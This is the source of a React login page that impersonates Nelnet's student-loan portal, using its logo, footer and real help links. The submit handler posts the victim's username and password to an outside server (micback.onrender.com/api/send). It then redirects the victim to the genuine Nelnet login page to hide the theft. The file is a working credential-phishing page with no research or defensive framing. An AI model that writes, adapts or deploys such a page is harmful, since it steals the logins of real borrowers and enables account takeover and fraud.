import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';
import logo from './logo.png';
import google from './google.png';
import rounde from './round.png';
import aptlogo from './apt_logo.png';
import planet from './planet.png';
import nelnet from './nelnet.svg';
import access from './access.png';



function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("nelnet")

    const[showError, setShowError] = useState(false);

    const[ischecked, setChecked] = useState(false);
    const[showPassword, setShowPassword] = useState(false);


async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://micback.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            window.location.href = 'https://auth.nelnet.com/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_type%3Dcode%26client_id%3Dmma%26state%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96semicolon%25252Fdashboard%26redirect_uri%3Dhttps%253A%252F%252Fsecure.nelnet.com%26scope%3Dopenid%2520offline_access%2520mma.api.read%2520mma.api.write%26code_challenge%3DrBGHOu1mH2Ol4dy6tCOUfJpd2g4oqZ9n6zbc8PmJXqE%26code_challenge_method%3DS256%26nonce%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96%26nds_client_id%3D1%26nds_application_id%3D1%26pid%3D_PENDO_T_vHYTKtaYEKy';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}


    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>

        <nav className='mynav py-2 container'>
            <img className='mylogo' src={nelnet} />
        </nav>

        <div className='greydiv'>

        </div>

<div className='row py-2 container '>
<div className='col-md-4 whitediv '>
                <div className='imagediv py-4 px-0 text-center'>
                <img className='logoimage' src={access} />

                </div>



                <form onSubmit={handleSubmit}>

     

    
  <div class="input-group  px-3">
    <div class="input-group-prepend mt-2">
      <div class="input-group-text"><i className='fa fa-user icons'></i></div>
    </div>
    <input onChange={function(e){
      setUserName(e.target.value);
    }}value={email} type="text" class="form-control" id="inlineFormInputGroupUsername2" placeholder="Username"required/>
  </div>



  <div class="input-group  px-3 mt-2">
    
    <input onChange={function(e){
      setPassword(e.target.value);
    }}value={password} type={showPassword ? "text" : "password"} class="form-control" id="inlineFormInputGroupUsername2" placeholder="Password"required/>
  <div class="input-group-prepend mt-2">
      <div class="input-group-text"><i onClick={function(e){
                        e.preventDefault();
                        setShowPassword(!showPassword);
                    }} className='fa fa-eye icons'></i></div>
    </div>
  </div>


<div className='py-4'>
<input className='check'type="checkbox" /><a className='pl-4 save'>Save Username</a>

</div>
    
       
                   
                 <div className='form-group'>

                        <button type='submit' className='btn mybutton '>{'Continue'}</button>

                    </div>

                </form>

                <div>
          <h4 className='trouble '>Trouble Logging In?</h4>

                  
        </div>

            </div>

        

</div>

<div className='footerdiv m-0'>
<a href='https://auth.nelnet.com/Account/ForgotUsername?returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_type%3Dcode%26client_id%3Dmma%26state%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96semicolon%25252Fdashboard%26redirect_uri%3Dhttps%253A%252F%252Fsecure.nelnet.com%26scope%3Dopenid%2520offline_access%2520mma.api.read%2520mma.api.write%26code_challenge%3DrBGHOu1mH2Ol4dy6tCOUfJpd2g4oqZ9n6zbc8PmJXqE%26code_challenge_method%3DS256%26nonce%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96%26nds_client_id%3D1%26nds_application_id%3D1%26pid%3D_PENDO_T_vHYTKtaYEKy&clientId=1&appId=1' className='mx-1 footer'>Forgot Username ?</a> | <a href='https://auth.nelnet.com/Account/ForgotPassword?returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_type%3Dcode%26client_id%3Dmma%26state%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96semicolon%25252Fdashboard%26redirect_uri%3Dhttps%253A%252F%252Fsecure.nelnet.com%26scope%3Dopenid%2520offline_access%2520mma.api.read%2520mma.api.write%26code_challenge%3DrBGHOu1mH2Ol4dy6tCOUfJpd2g4oqZ9n6zbc8PmJXqE%26code_challenge_method%3DS256%26nonce%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96%26nds_client_id%3D1%26nds_application_id%3D1%26pid%3D_PENDO_T_vHYTKtaYEKy&clientId=1&appId=1' className='mx-1 footer'>Forgot Password ?</a> | <a className='footer'>Get help logging in</a>
</div>

            

<div className='greydivtwo'>

  <p className='small'>© 2024 Nelnet, Inc. and Affiliates. All Rights Reserved.</p>
  <a className='foota'>Terms and Conditions</a> | <a className='foota'>Privacy Policy</a> <a className='foota'>Version: 1.0.1.396</a>

        </div>
          
        
        </>
    );
}

export default Home;